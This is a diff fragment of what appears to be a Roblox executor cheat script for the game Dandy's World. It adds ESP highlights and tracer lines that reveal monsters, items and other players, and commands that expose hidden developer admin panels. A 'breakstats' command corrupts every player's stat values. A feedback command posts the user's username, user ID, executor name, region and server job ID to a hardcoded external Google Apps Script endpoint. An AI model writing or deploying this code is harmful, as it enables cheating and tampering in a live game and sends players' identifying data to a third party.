+									label.Text = generatorName .. "\n(" .. (currentAmount and round(currentAmount.Value) or 0) .. " / " .. (requiredAmount and requiredAmount.Value or 0) .. ")"
+								end
+							end
+						end
+
+						if connie then
+							connie:GetPropertyChangedSignal("Value"):Connect(updateGeneratorAppearance)
+						end
+
+						if completed then
+							completed:GetPropertyChangedSignal("Value"):Connect(updateGeneratorAppearance)
+						end
+
+						if currentAmount then
+							currentAmount:GetPropertyChangedSignal("Value"):Connect(updateGeneratorAppearance)
+						end
+
+						if requiredAmount then
+							requiredAmount:GetPropertyChangedSignal("Value"):Connect(updateGeneratorAppearance)
+						end
+
+						if playeractive then
+							playeractive:GetPropertyChangedSignal("Value"):Connect(updateGeneratorAppearance)
+						end
+
+						makeespbillboard(generator, generator.Name, textColor, {
+							CurrentAmount = currentAmount and round(currentAmount.Value) or 0,
+							RequiredAmount = requiredAmount and requiredAmount.Value or 0
+						})
+
+						updateGeneratorAppearance()
+					end
+				end
+			end
+		end
+	end
+end
+
+function removeesp()
+	local currentRoom = workspace:FindFirstChild("CurrentRoom")
+
+	if currentRoom then
+		for _, model in pairs(currentRoom:GetChildren()) do
+			for _, folderName in pairs { "Monsters", "Items", "Generators" } do
+				local folder = model:FindFirstChild(folderName)
+				if folder then
+					for _, obj in pairs(folder:GetChildren()) do
+						if legacyhighlights then
+							local adornment = obj:FindFirstChild("EspAdornment")							
+							if adornment then
+								adornment:Destroy()
+							end
+						else
+							local highlight = obj:FindFirstChild("EspHighlight")							
+							if highlight then
+								highlight:Destroy()
+							end
+						end
+
+						local billboard = obj:FindFirstChild("EspBillboardGUIName")							
+						if billboard then
+							billboard:Destroy()
+						end
+					end
+				end
+			end
+
+			local freeArea = model:FindFirstChild("FreeArea")
+			if freeArea then
+				for _, child in pairs(freeArea:GetChildren()) do
+					if child.Name == "SproutTendril" then
+						if legacyhighlights then
+							local adornment = child:FindFirstChild("EspAdornment")
+							if adornment then
+								adornment:Destroy()
+							end
+						else
+							local highlight = child:FindFirstChild("EspHighlight")
+							if highlight then
+								highlight:Destroy()
+							end
+						end
+
+						local billboard = child:FindFirstChild("EspBillboardGUIName")
+						if billboard then
+							billboard:Destroy()
+						end
+					end
+				end
+
+				local fakeElevatorfolder = freeArea:FindFirstChild("FakeElevator")
+				if fakeElevatorfolder then
+					local fakeElevator = fakeElevatorfolder:FindFirstChild("ElevatorDoor")
+					if fakeElevator and fakeElevator:IsA("Model") then
+						if legacyhighlights then
+							local adornment = fakeElevator:FindFirstChild("EspAdornment")
+							if adornment then
+								adornment:Destroy()
+							end
+						else
+							local highlight = fakeElevator:FindFirstChild("EspHighlight")
+							if highlight then
+								highlight:Destroy()
+							end
+						end
+
+						local billboard = fakeElevator:FindFirstChild("EspBillboardGUIName")
+						if billboard then
+							billboard:Destroy()
+						end
+					end
+				end
+			end
+
+			for _, child in pairs(model:GetChildren()) do
+				if child.Name == "BlotHand" or child.Name == "BlotHandZone_1" or child.Name == "BlotHandZone_2" then
+					if legacyhighlights then
+						local adornment = child:FindFirstChild("EspAdornment")
+						if adornment then
+							adornment:Destroy()
+						end
+					else
+						local highlight = child:FindFirstChild("EspHighlight")
+						if highlight then
+							highlight:Destroy()
+						end
+					end
+
+					local billboard = child:FindFirstChild("EspBillboardGUIName")
+					if billboard then
+						billboard:Destroy()
+					end
+				end
+			end
+		end
+	end
+
+	local elevators = workspace:FindFirstChild("Elevators")
+	if elevators then
+		local elevator = elevators:FindFirstChild("Elevator")
+		local fakeElevator = elevator and elevator:FindFirstChild("ElevatorDoor")
+		if fakeElevator and fakeElevator:IsA("Model") then
+			if legacyhighlights then
+				local adornment = fakeElevator:FindFirstChild("EspAdornment")
+				if adornment then
+					adornment:Destroy()
+				end
+			else
+				local highlight = fakeElevator:FindFirstChild("EspHighlight")
+				if highlight then
+					highlight:Destroy()
+				end
+			end
+
+			local billboard = fakeElevator:FindFirstChild("EspBillboardGUIName")
+			if billboard then
+				billboard:Destroy()
+			end
+		end
+	end
+
+	for _, player in pairs(noxious["players"]:GetPlayers()) do
+		if player.Character then
+			if legacyhighlights then
+				local adornment = player.Character:FindFirstChild("EspAdornment")				
+				if adornment then
+					adornment:Destroy()
+				end
+			else
+				local highlight = player.Character:FindFirstChild("EspHighlight")				
+				if highlight then
+					highlight:Destroy()
+				end
+			end
+
+			local billboard = player.Character:FindFirstChild("EspBillboardGUIName")				
+			if billboard then
+				billboard:Destroy()
+			end
+		end
+	end
+end
+
+function startesploop()
+	if esplooprunning then return end
+	esplooprunning = true
+
+	noxious["run service"].Stepped:Connect(function()
+		if esplooprunning then
+			addesp()
+		end
+	end)
+end
+
+function stopesploop()
+	esplooprunning = false
+	removeesp()
+end
+
+function enableesp(type)
+	noxious["esp types"][type] = true
+	startesploop()
+end
+
+function disableesp(type)
+	noxious["esp types"][type] = false
+
+	local allDisabled = true
+	for _, isEnabled in pairs(noxious["esp types"]) do
+		if isEnabled then
+			allDisabled = false
+			break
+		end
+	end
+
+	if allDisabled then
+		stopesploop()
+	else
+		removeesp()
+	end
+end
+
+addcommand("hideesptext", "hespt", function()
+	toggleespbillboardvisibility(false)
+	toggleesphighlightvisibility(true)
+end)
+
+addcommand("showesptext", "sespt", function()
+	toggleespbillboardvisibility(true)
+	if toggleesphighlightvisibility(true) then
+		toggleespbillboardvisibility(false)
+	end
+end)
+
+addcommand("hideesphighighlights", "hesph", function()
+	toggleesphighlightvisibility(false)
+	toggleespbillboardvisibility(true)
+end)
+
+addcommand("showesphighighlights", "sesph", function()
+	toggleesphighlightvisibility(true)
+	if toggleespbillboardvisibility(true) then
+		toggleesphighlightvisibility(false)
+	end
+end)
+
+addcommand("enableallesp", "eaesp", function()
+	playeresp = true
+	twistedesp = true
+	machineesp = true
+	itemesp = true
+	fakeelevatoresp = true
+	elevatoresp = true
+	tendrilesp = true
+	blothandsesp = true
+	for type in pairs(noxious["esp types"]) do
+		noxious["esp types"][type] = true
+	end
+	spawn(removeesp)
+	startesploop()
+end)
+
+addcommand("disableallesp", "daesp", function()
+	playeresp = false
+	twistedesp = false
+	machineesp = false
+	itemesp = false
+	fakeelevatoresp = false
+	elevatoresp = false
+	tendrilesp = false
+	blothandsesp = false
+	for type in pairs(noxious["esp types"]) do
+		noxious["esp types"][type] = false
+	end
+	spawn(removeesp)
+	stopesploop()
+end)
+
+addcommand("enableplayeresp", "epesp", function()
+	playeresp = true
+	enableesp("Players")
+end)
+
+addcommand("disableplayeresp", "dpesp", function()
+	playeresp = false
+	disableesp("Players")
+end)
+
+addcommand("enablemachineesp", "emesp", function()
+	machineesp = true
+	enableesp("Machines")
+end)
+
+addcommand("disablemachineesp", "dmesp", function()
+	machineesp = false
+	disableesp("Machines")
+end)
+
+addcommand("enabletwistedesp", "etesp", function()
+	twistedesp = true
+	enableesp("Monsters")
+end)
+
+addcommand("disabletwistedesp", "dtesp", function()
+	twistedesp = false
+	disableesp("Monsters")
+end)
+
+addcommand("enableitemesp", "eiesp", function()
+	itemesp = true
+	enableesp("Items")
+end)
+
+addcommand("disableitemesp", "diesp", function()
+	itemesp = false
+	disableesp("Items")
+end)
+
+addcommand("enableelevatoresp", "eeesp", function()
+	elevatoresp = true
+	enableesp("Elevator")
+end)
+
+addcommand("disableelevatoresp", "deesp", function()
+	elevatoresp = false
+	disableesp("Elevator")
+end)
+
+addcommand("enablefakeelevatoresp", "efeesp", function()
+	fakeelevatoresp = true
+	enableesp("FakeElevator")
+end)
+
+addcommand("disablefakeelevatoresp", "dfeesp", function()
+	fakeelevatoresp = false
+	disableesp("FakeElevator")
+end)
+
+addcommand("enablesproutstendrilesp", "estesp", function()
+	tendrilesp = true
+	enableesp("Tendrils")
+end)
+
+addcommand("disablesproutstendrilesp", "dstesp", function()
+	tendrilesp = false
+	disableesp("Tendrils")
+end)
+
+addcommand("enableblotshandsesp", "ebhesp", function()
+	blothandsesp = true
+	enableesp("BlotHands")
+end)
+
+addcommand("disableblotshandsesp", "dbhesp", function()
+	blothandsesp = false
+	disableesp("BlotHands")
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+local tracerTypes = {
+	Players = true,
+	Monsters = true,
+	Items = true,
+	Machines = true,
+	FakeElevator = true,
+	Elevator = true,
+	Tendrils = true,
+	BlotHands = true,
+}
+
+local tracerEnabled = true
+local tracerGui = nil
+local tracerLines = {}
+local tracerLastUpdate = 0
+local updateInterval = 0.01
+
+function getModelCenter(model)
+	if not model or not model:IsA("Model") then return nil end
+
+	local parts = {}
+	for _, part in pairs(model:GetDescendants()) do
+		if part:IsA("BasePart") then
+			table.insert(parts, part)
+		end
+	end
+	if #parts == 0 then return nil end
+
+	local totalPosition = Vector3.new(0, 0, 0)
+	for _, part in pairs(parts) do
+		totalPosition = totalPosition + part.Position
+	end
+	return totalPosition / #parts
+end
+
+function setupTracerGui()
+	if tracerGui then return end
+	tracerGui = noxious["screen gui"]
+end
+
+function getGeneratorColor(generator)
+	if not generator then return getespcolor("machines") end
+	local statsFolder = generator:FindFirstChild("Stats")
+	if not statsFolder then return getespcolor("machines") end
+
+	local completed = statsFolder:FindFirstChild("Completed")
+	local connie = statsFolder:FindFirstChild("Connie")
+
+	if connie and connie.Value == true then
+		return getespcolor("posessedmachines")
+	elseif completed and completed.Value == true then
+		return getespcolor("completedmachines")
+	else
+		return getespcolor("machines")
+	end
+end
+
+function updateTracers()
+	local currentRoom = workspace:FindFirstChild("CurrentRoom")
+	if tick() - tracerLastUpdate < updateInterval then return end
+	tracerLastUpdate = tick()
+
+	if not tracerEnabled then return end
+	setupTracerGui()
+
+	local targets = {}
+
+	if tracerTypes.Players then
+		for _, player in pairs(game.Players:GetPlayers()) do
+			if player ~= noxious["local player"] then
+				local character = player.Character
+				if character then
+					local center = getModelCenter(character)
+					if center then
+						local screenPoint, onScreen = workspace.CurrentCamera:WorldToScreenPoint(center)
+						if onScreen then
+							table.insert(targets, {
+								position = Vector2.new(screenPoint.X, screenPoint.Y),
+								color = getespcolor("players")
+							})
+						end
+					end
+				end
+			end
+		end
+	end
+
+	if tracerTypes.Monsters and currentRoom then
+		for _, model in pairs(currentRoom:GetChildren()) do
+			local monstersFolder = model:FindFirstChild("Monsters")
+			if monstersFolder then
+				for _, monster in pairs(monstersFolder:GetChildren()) do
+					if monster:IsA("Model") then
+						local center = getModelCenter(monster)
+						if center then
+							local screenPoint, onScreen = workspace.CurrentCamera:WorldToScreenPoint(center)
+							if onScreen then
+								local color
+								local monsterName = monster.Name
+
+								if table.find({"AstroMonster", "VeeMonster", "SproutMonster", "PebbleMonster", "ShellyMonster", "DandyMonster"}, monsterName) then
+									local tweenProgress = math.abs(math.sin(tick() * math.pi / 2))
+									color = getespcolor("twisteds"):Lerp(Color3.fromRGB(0, 0, 0), tweenProgress)
+
+								elseif table.find({"BassieMonster", "EggsonMonster", "FlyteMonster", "CocoaMonster"}, monsterName) then
+									local tweenProgress = math.abs(math.sin(tick() * math.pi / 2))
+									color = Color3.fromRGB(140, 255, 140):Lerp(Color3.fromRGB(237, 121, 210), tweenProgress)
+
+								else
+									color = getespcolor("twisteds")
+								end
+
+								table.insert(targets, {
+									position = Vector2.new(screenPoint.X, screenPoint.Y),
+									color = color
+								})
+							end
+						end
+					end
+				end
+			end
+		end
+	end
+
+	function getItemColor(item)
+		if not item then 
+			local tweenProgress = math.abs(math.sin(tick() * math.pi / 2))
+			return Color3.fromRGB(140, 255, 140):Lerp(Color3.fromRGB(237, 121, 210), tweenProgress)
+		end
+
+		local tweenItems = {
+			"HolidayCollectibleItem",
+			"Holiday Collectible Item",
+			"Basket",
+		}
+
+		if item.Name == "ResearchCapsule" then
+			local prompt = item:FindFirstChild("Prompt")
+			if prompt then
+				local monsterString = prompt:FindFirstChild("Monster")
+				if monsterString and monsterString:IsA("StringValue") then
+					local monsterName = monsterString.Value
+					monsterName = monsterName:gsub("Monster", ""):match("^%s*(.-)%s*$")
+
+					if monsterName == "Eggson" or monsterName == "Cocoa" or monsterName == "Bassie" or monsterName == "Flyte" then
+						local tweenProgress = math.abs(math.sin(tick() * math.pi / 2))
+						return Color3.fromRGB(140, 255, 140):Lerp(Color3.fromRGB(237, 121, 210), tweenProgress)
+					end
+
+					if monsterName == "Dandy" or monsterName == "Sprout" or monsterName == "Astro" or monsterName == "Shelly" or monsterName == "Vee" or monsterName == "Pebble" then
+						local tweenProgress = math.abs(math.sin(tick() * math.pi / 2))
+						return getespcolor("items"):Lerp(Color3.fromRGB(0, 0, 0), tweenProgress)
+					end
+				end
+			end
+		end
+
+		if table.find(tweenItems, item.Name) then
+			local tweenProgress = math.abs(math.sin(tick() * math.pi / 2))
+			return Color3.fromRGB(140, 255, 140):Lerp(Color3.fromRGB(237, 121, 210), tweenProgress)
+		end
+
+		local itemColors = {
+			FakeCapsule = getespcolor("fakecapsules"),
+
+			JumperCable = getespcolor("rareitems"),
+			Bandage = getespcolor("rareitems"),
+			AirHorn = getespcolor("rareitems"),
+			Jawbreaker = getespcolor("rareitems"),
+			BonBon = getespcolor("rareitems"),
+			ExtrctionSpeedCandy = getespcolor("rareitems"),
+
+			PopBottle = getespcolor("superrareitems"),
+			HealthKit = getespcolor("superrareitems"),
+			ChocolateBox = getespcolor("superrareitems"),
+			EjectButton = getespcolor("superrareitems"),
+			SmokeBomb = getespcolor("superrareitems"),
+		}
+
+		return itemColors[item.Name] or getespcolor("items")
+	end
+
+	if tracerTypes.Items and currentRoom then
+		for _, model in pairs(currentRoom:GetChildren()) do
+			local itemsFolder = model:FindFirstChild("Items")
+			if itemsFolder then
+				for _, item in pairs(itemsFolder:GetChildren()) do
+					if item:IsA("Model") then
+						local center = getModelCenter(item)
+						if center then
+							local screenPoint, onScreen = workspace.CurrentCamera:WorldToScreenPoint(center)
+							if onScreen then
+								table.insert(targets, {
+									position = Vector2.new(screenPoint.X, screenPoint.Y),
+									color = getItemColor(item)
+								})
+							end
+						end
+					end
+				end
+			end
+		end
+	end
+
+	if tracerTypes.Machines and currentRoom then
+		for _, model in pairs(currentRoom:GetChildren()) do
+			local generatorsFolder = model:FindFirstChild("Generators")
+			if generatorsFolder then
+				for _, generator in pairs(generatorsFolder:GetChildren()) do
+					if generator:IsA("Model") then
+						local center = getModelCenter(generator)
+						if center then
+							local screenPoint, onScreen = workspace.CurrentCamera:WorldToScreenPoint(center)
+							if onScreen then
+								local color = getGeneratorColor(generator)
+								table.insert(targets, {
+									position = Vector2.new(screenPoint.X, screenPoint.Y),
+									color = color
+								})
+							end
+						end
+					end
+				end
+			end
+		end
+	end
+
+	if tracerTypes.Tendrils then
+		if currentRoom then
+			for _, model in pairs(currentRoom:GetChildren()) do
+				local freeArea = model:FindFirstChild("FreeArea")
+				if freeArea then
+					local tendril = freeArea:FindFirstChild("SproutTendril")
+					if tendril and tendril:IsA("Model") then
+						local center = getModelCenter(tendril)
+						if center then
+							local screenPoint, onScreen = workspace.CurrentCamera:WorldToScreenPoint(center)
+							if onScreen then
+								table.insert(targets, {
+									position = Vector2.new(screenPoint.X, screenPoint.Y),
+									color = getespcolor("tendrils")
+								})
+							end
+						end
+					end
+				end
+			end
+		end
+	end
+
+	if tracerTypes.BlotHands then
+		for _, model in pairs(currentRoom:GetChildren()) do
+			for _, child in pairs(model:GetChildren()) do
+				if child.Name == "BlotHand" or child.Name == "BlotHandZone_1" or child.Name == "BlotHandZone_2" and not child:FindFirstChildOfClass("Highlight") then
+					local center = getModelCenter(child)
+					if center then
+						local screenPoint, onScreen = workspace.CurrentCamera:WorldToScreenPoint(center)
+						if onScreen then
+							table.insert(targets, {
+								position = Vector2.new(screenPoint.X, screenPoint.Y),
+								color = getespcolor("blotshands")
+							})
+						end
+					end
+				end
+			end
+		end
+	end
+
+	if tracerTypes.FakeElevator and currentRoom then
+		for _, model in pairs(currentRoom:GetChildren()) do
+			local freeArea = model:FindFirstChild("FreeArea")
+			if freeArea then
+				local fakeElevator = freeArea:FindFirstChild("FakeElevator")
+				if fakeElevator and fakeElevator:IsA("Model") then
+					local center = getModelCenter(fakeElevator)
+					if center then
+						local screenPoint, onScreen = workspace.CurrentCamera:WorldToScreenPoint(center)
+						if onScreen then
+							local tweenProgress = math.abs(math.sin(tick() * math.pi / 2))
+							local color = getespcolor("fakeelevator"):Lerp(Color3.fromRGB(0, 0, 0), tweenProgress)
+							table.insert(targets, {
+								position = Vector2.new(screenPoint.X, screenPoint.Y),
+								color = color
+							})
+						end
+					end
+				end
+			end
+		end
+	end
+
+	if tracerTypes.Elevator and currentRoom then
+		for _, model in pairs(currentRoom:GetChildren()) do
+			local elevatorsfolder = game.Workspace:FindFirstChild("Elevators")
+			if elevatorsfolder then
+				local elevatormodel = elevatorsfolder:FindFirstChild("Elevator")
+				if elevatormodel then
+					local elevatordoor = game.Workspace.Elevators.Elevator.ElevatorDoor
+					if elevatordoor and elevatordoor:IsA("Model") then
+						local center = getModelCenter(elevatordoor)
+						if center then
+							local screenPoint, onScreen = workspace.CurrentCamera:WorldToScreenPoint(center)
+							if onScreen then
+								local tweenProgress = math.abs(math.sin(tick() * math.pi / 2))
+								local color = getespcolor("elevator"):Lerp(Color3.fromRGB(0, 0, 0), tweenProgress)
+								table.insert(targets, {
+									position = Vector2.new(screenPoint.X, screenPoint.Y),
+									color = color
+								})
+							end
+						end
+					end
+				end
+			end
+		end
+	end
+
+	if #targets > #tracerLines then
+		for i = #tracerLines + 1, #targets do
+			local line = Instance.new("Frame")
+			line.Name = "TracerLine"
+			line.AnchorPoint = Vector2.new(0.5, 0.5)
+			line.BackgroundTransparency = 0.3
+			line.BackgroundColor3 = Color3.new(1, 1, 1)
+			line.BorderSizePixel = 1
+			line.BorderColor3 = Color3.new(1, 1, 1)
+			line.Parent = tracerGui
+			table.insert(tracerLines, line)
+		end
+	end
+
+	for i, line in pairs(tracerLines) do
+		local target = targets[i]
+		if not target then
+			line:Destroy()
+			table.remove(tracerLines, i)
+		else
+			local origin = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y * 0.9)
+			local destination = target.position
+
+			local position = (origin + destination) / 2
+			line.Position = UDim2.new(0, position.X, 0, position.Y)
+
+			local length = (origin - destination).Magnitude
+			line.Size = UDim2.new(0, length, 0, 2)
+
+			line.Rotation = math.deg(math.atan2(destination.Y - origin.Y, destination.X - origin.X))
+			line.BackgroundColor3 = target.color
+
+			line.BackgroundTransparency = 0
+		end
+	end
+end
+
+tracerconnection = nil
+
+function enableTracer(type)
+	if not tracerconnection then tracerconnection = noxious["run service"].RenderStepped:Connect(updateTracers) end
+	if tracerTypes[type] ~= nil then
+		tracerTypes[type] = true
+		tracerEnabled = true
+	end
+end
+
+function disableTracer(type)
+	if tracerconnection then
+		tracerconnection:Disconnect()
+		tracerconnection = nil
+	end
+	if tracerTypes[type] ~= nil then
+		tracerTypes[type] = false
+	end
+	for _, line in pairs(tracerLines) do
+		line:Destroy()
+	end
+end
+
+function toggleTracers(enabled)
+	tracerEnabled = enabled
+	if not enabled then
+		for _, line in pairs(tracerLines) do
+			line:Destroy()
+		end
+		tracerLines = {}
+	end
+end
+
+toggleTracers(false)
+
+function disablealltracers()
+	toggleTracers(false)
+	disableTracer("Monsters")
+	disableTracer("FakeElevator")
+	disableTracer("Tendrils")
+	disableTracer("BlotHands")
+	disableTracer("Elevator")
+	disableTracer("Machines")
+	disableTracer("Items")
+end
+
+function enablealltracers()
+	if inlobby() then enableTracer("Players") return end
+	toggleTracers(true)
+	enableTracer("Monsters")
+	enableTracer("FakeElevator")
+	enableTracer("Tendrils")
+	enableTracer("BlotHands")
+	enableTracer("Elevator")
+	enableTracer("Machines")
+	enableTracer("Items")
+	enableTracer("Players")
+end
+
+disablealltracers()
+
+addcommand("enablealltracers", "eat", function()
+	enablealltracers()
+end)
+
+addcommand("disablealltracers", "dat", function()
+	disablealltracers()
+end)
+
+addcommand("enableplayertracers", "ept", function()
+	enableTracer("Players")
+end)
+
+addcommand("disableplayertracers", "dpt", function()
+	disableTracer("Players")
+end)
+
+addcommand("enablemachinetracers", "emt", function()
+	enableTracer("Machines")
+end)
+
+addcommand("disablemachinetracers", "dmt", function()
+	disableTracer("Machines")
+end)
+
+addcommand("enabletwistedtracers", "ett", function()
+	enableTracer("Monsters")
+end)
+
+addcommand("disabletwistedtracers", "dtt", function()
+	disableTracer("Monsters")
+end)
+
+addcommand("enableitemtracers", "eit", function()
+	enableTracer("Item")
+end)
+
+addcommand("disableitemtracers", "dit", function()
+	disableTracer("Item")
+end)
+
+addcommand("enablefakeelevatortracers", "efet", function()
+	enableTracer("FakeElevator")
+end)
+
+addcommand("disablefakeelevatortracers", "dfet", function()
+	disableTracer("FakeElevator")
+end)
+
+addcommand("enableelevatortracers", "eet", function()
+	enableTracer("Elevator")
+end)
+
+addcommand("disableelevatortracers", "det", function()
+	disableTracer("Elevator")
+end)
+
+addcommand("enablesproutstendriltracers", "estt", function()
+	enableTracer("Tendrils")
+end)
+
+addcommand("disablesproutstendriltracers", "dstt", function()
+	disableTracer("Tendrils")
+end)
+
+addcommand("enableblotshandstracers", "ebht", function()
+	enableTracer("BlotHands")
+end)
+
+addcommand("disableblotshandstracers", "dbht", function()
+	disableTracer("BlotHands")
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+local sendcooldown = false
+
+addcommand("feedback", "fb", function(...)
+	local text = table.concat({...}, " ")
+	if sendcooldown == true then return end
+	sendcooldown = true
+	local DName = noxious["local player"].DisplayName
+	local Name = noxious["username"]
+	local Userid = noxious["local player"].UserId
+	local AccountAge = noxious["local player"].AccountAge
+	local Country = game.LocalizationService.RobloxLocaleId
+	local ConsoleJobId = game.JobId
+	local feedback = text
+	if feedback == "" then return end
+	if not feedback then return end
+
+	local GAMENAME = noxious["marketplace service"]:GetProductInfo(game.PlaceId).Name
+
+	local function detectExecutor()
+		return identifyexecutor()
+	end
+
+	local function createWebhookData()
+		local webhookcheck = detectExecutor()
+
+		local data = {
+			avatar_url="",
+			content="**" .. DName .. " (@" .. Name .. ")** Sent script feedback from **Noxious Hub: Dandy's World (Version " .. noxious["version"] .. ")** | [**View Player**](https://www.roblox.com/users/"..Userid..") | [**Join Server**](https://www.roblox.com/games/start?placeId=84414892540434&launchData=".. game.PlaceId .."/" ..ConsoleJobId..")",
+			embeds={
+				{
+					author={
+						name="",
+						url="https://roblox.com",
+					},
+					description=tostring(
+						"\n\n**[Noxious Info]:**" ..
+							"\n**• Version:** `"..noxious["version"].."`" ..
+
+							"\n\n**[[User Info]:](https://www.roblox.com/users/"..Userid..")**" ..
+							"\n**• Display Name:** `"..DName.."`" ..
+							"\n**• Username:** `"..Name.."`" .. 
+							"\n**• Executor:** `"..webhookcheck.."`" ..
+							"\n**• Region:** `"..Country.."`" ..
+
+							"\n\n**[Feedback]:**" ..
+							"\n`"..feedback.."`"
+
+					),
+					type="rich",
+					color=tonumber"0xFFFFFF",
+					thumbnail={
+						url="https://www.roblox.com/headshot-thumbnail/image?userId=" .. noxious["local player"].UserId .. "&width=420&height=420&format=png"
+					},
+				}
+			}
+		}
+		return noxious["http service"]:JSONEncode(data)
+	end
+
+	local function sendWebhook(webhookUrl, data)
+		local headers = {
+			["content-type"] = "application/json"
+		}
+
+		local request = http_request or request or HttpPost or syn.request
+		local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
+		request(abcdef)
+	end
+
+	local webhookUrl = "https://script.google.com/macros/s/AKfycbwUeXdOup55hC6-tWPwwt_kRsT9bp0memetZ8-zWhCykRuD8j7KxMDe738M_oSWyqCu/exec"
+	local webhookData = createWebhookData()
+	if feedback == "" then return end
+	if not feedback then return end
+
+	task.spawn(function() sendWebhook(webhookUrl, webhookData) end)
+	task.wait(10)
+	sendcooldown = false
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("getdonorperks", "donorperks", function()
+	local everyClipboard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
+
+	function copytoclipboard(txt)
+		if everyClipboard then
+			everyClipboard(tostring(txt))
+			notify("Copied to clipboard.", 5)
+		else
+			notify("Unable to access clipboard.", 5, "error")
+		end
+	end
+	copytoclipboard"https://www.roblox.com/game-pass/1085884381/Noxious-Donor"	
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function changedialoguesound(sound)
+	local lp = game:GetService("Players").LocalPlayer
+
+	local function playSound()
+		local s = Instance.new("Sound")
+		s.Name = "SampleSound"
+		s.SoundId = "rbxassetid://" .. sound
+		s.Volume = 5
+		s.PlayOnRemove = true
+		s.Parent = lp:WaitForChild("PlayerGui")
+		s:Destroy()
+	end
+
+	local function onCharAdded(char)
+		local hrp = char:WaitForChild("HumanoidRootPart", 5)
+		if not hrp then return end
+
+		for _, child in ipairs(hrp:GetChildren()) do
+			if child:IsA("BillboardGui") then
+				playSound()
+				break
+			end
+		end
+
+		hrp.ChildAdded:Connect(function(child)
+			if child:IsA("BillboardGui") then
+				playSound()
+			end
+		end)
+	end
+
+	if lp.Character then
+		onCharAdded(lp.Character)
+	end
+
+	lp.CharacterAdded:Connect(onCharAdded)
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+local eggsonSpeed = 1
+local eggsonConnection
+
+addcommand("enablespameggsonabilityaudio", "eseaa", function(speed)
+	if not checktoon("Eggson") then return end
+	task.spawn(function() execcmd("elaa") end)
+
+	speed = tonumber(speed)
+	eggsonSpeed = speed
+
+	local player = game:GetService("Players").LocalPlayer
+
+	if eggsonConnection then
+		eggsonConnection:Disconnect()
+	end
+
+	eggsonConnection = noxious["run service"].RenderStepped:Connect(function()
+		local character = player.Character
+		local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
+		if humanoid then
+			for _, track in ipairs(humanoid:GetPlayingAnimationTracks()) do
+				if track and track.Speed ~= eggsonSpeed then
+					track:AdjustSpeed(eggsonSpeed)
+				end
+			end
+		end
+	end)
+end)
+
+addcommand("disablespameggsonabilityaudio", "dseaa", function()
+	if not checktoon("Eggson") then return end
+	task.spawn(function() execcmd("dlaa") end)
+
+	if eggsonConnection then
+		eggsonConnection:Disconnect()
+		eggsonConnection = nil
+	end
+
+	local player = game:GetService("Players").LocalPlayer
+	local character = player.Character
+	local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
+
+	if humanoid then
+		for _, track in ipairs(humanoid:GetPlayingAnimationTracks()) do
+			track:AdjustSpeed(1)
+		end
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("facelessshrimpo", "flshrimpo", function()
+	if not checktoon("Shrimpo") then return end
+	local head = character:WaitForChild("Head")
+	head.TextureID = "rbxassetid://74753871938677"
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("whatsappastro", "whatsastro", function()
+	if not checktoon("Astro") then return end
+	local textureId = "rbxassetid://106334801105183"
+
+	local character = noxious["character"]
+
+	local partsToTexture = {"Body", "Cap", "Head", "LegL", "LegL2", "LegR", "LegR2"}
+
+	for _, partName in ipairs(partsToTexture) do
+		local part = character:FindFirstChild(partName)
+		if part and part:IsA("SpecialMesh") or part:IsA("MeshPart") then
+			part.TextureID = textureId
+		end
+	end
+
+	local magicL = character:FindFirstChild("MagicL")
+	local magicR = character:FindFirstChild("MagicR")
+
+	if magicL and magicL:IsA("SpecialMesh") or magicL:IsA("MeshPart") then
+		magicL.Color = Color3.fromRGB(99, 178, 100)
+		local emitter = magicL:FindFirstChildOfClass("ParticleEmitter")
+		if emitter then
+			emitter.Color = ColorSequence.new(Color3.fromRGB(100, 251, 105))
+		end
+	end
+
+	if magicR and magicR:IsA("SpecialMesh") or magicR:IsA("MeshPart") then
+		magicR.Color = Color3.fromRGB(99, 178, 100)
+		local emitter = magicR:FindFirstChildOfClass("ParticleEmitter")
+		if emitter then
+			emitter.Color = ColorSequence.new(Color3.fromRGB(100, 251, 105))
+		end
+	end
+
+	local config = character:FindFirstChild("Config")
+	if config and config:FindFirstChild("HurtTexture") then
+		config.HurtTexture.Texture = "rbxassetid://103271535882802"
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("smilingcosmo", "scosmo", function()
+	if not checktoon("Cosmo") then return end
+	local head = character:WaitForChild("Head")			
+	head.TextureID = "rbxassetid://70657488373630"
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("breakstats", "bstats", function()
+	local inGamePlayersFolder = game.Workspace:FindFirstChild("InGamePlayers")
+
+	if inGamePlayersFolder then
+		for _, playerFolder in pairs(inGamePlayersFolder:GetChildren()) do
+			local statsFolder = playerFolder:FindFirstChild("Stats")
+
+			if statsFolder then
+				for _, stat in pairs(statsFolder:GetChildren()) do
+					if stat:IsA("NumberValue") then
+						stat.Value = "nan"
+					end
+				end
+			end
+		end
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("showadminpanel", "sap", function()
+	if game.PlaceId == noxious["dandy's world lobby"] then
+
+		local devframe = noxious["replicated storage"].Admin.DevFrame
+		devframe.Frame.Visible = true
+		devframe.Frame.Parent = noxious["local player"].PlayerGui.MainGui
+	end
+
+	if game.PlaceId == noxious["dandy's world run"] then
+
+		local function showgui(parent)
+			for _, child in ipairs(parent:GetChildren()) do
+				if child:IsA("GuiObject") then
+					child.Visible = true
+				end
+				showgui(child)
+			end
+		end
+
+		if noxious["local player"] and noxious["local player"]:FindFirstChild("PlayerGui") then
+			for _, screenGui in ipairs(noxious["local player"].PlayerGui:GetChildren()) do
+				if screenGui:IsA("ScreenGui") then
+					local devFrame = screenGui:FindFirstChild("DevFrame")						
+					if devFrame and devFrame:IsA("Frame") then
+						devFrame.Visible = true
+						showgui(devFrame)
+					end
+				end
+			end
+		end
+	end
+end)
+
